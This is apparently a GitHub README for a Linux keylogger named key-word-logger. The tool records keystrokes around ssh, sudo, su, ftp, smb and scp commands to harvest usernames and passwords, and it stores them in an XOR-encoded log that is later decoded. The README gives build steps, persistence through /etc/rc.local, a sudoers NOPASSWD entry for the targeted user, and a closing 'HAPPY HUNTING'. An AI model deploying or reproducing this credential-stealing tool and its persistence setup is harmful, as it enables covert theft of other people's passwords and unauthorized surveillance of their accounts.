# key-word-logger
Simple Linux keylogger, working with keywords.

Key-word-logger is a tool primarily based on gsingh93's "simple-key-logger", but targeting and keylogging commands like:

ssh, smb, ftp, sftp, ftps, su, sudo, scp

aiming to extract targeted information like usernames and passwords. The information is then logged in a XOR encoded file and once the file is extracted, "decoder"
is used to get the information.

MAKE SURE YOU CHANGE THE ENCODING KEYS!

Tool has been tested on:

-Ubuntu 18.10/16.04.5/14.04.5

-Debian 9.7

-CentOS 7

# Installation
1. Grab the required packages (Ubuntu/Debian)
```
$ git clone https://github.com/littlepwnie/key-word-logger.git
$ sudo apt update
$ sudo apt install git make gcc g++ autotools-dev automake
```

Or in CentOS
```
$ git clone https://github.com/littlepwnie/key-word-logger.git
$ sudo yum update
$ sudo yum install git make gcc g++ autotools-dev automake
```

2. Install
```
$ cd key-word-logger
$ make
$ sudo ./keywlogger
$ nano /etc/rc.local
```
And add:
```
/path/to/keywlogger
```
right over
```
exit 0
```
Then edit:
```
$ nano /etc/sudoers
```
And add:
```
username ALL = NOPASSWD: /path/to/keywlogger
```
Where username is to be replaced with the one of the user we want to log.

All the information we want is now logged under /var/log/keywlogger.log and upon reboot our program will run as a service. We can check it using pgrep:
```
pgrep keywlogger
```

# Use the decoder
We put the keywlogger.log file at the same directory as our decoder, then compile and run it. The decoder should return a file named “decrypted.txt” which contains the information.
```
$ gcc decoder.c -o decoder
$ ./decoder
```

# TODO

- Kernel space module

Feel free to help improve it, test it in more versions and ask any questions!
HAPPY HUNTING :D
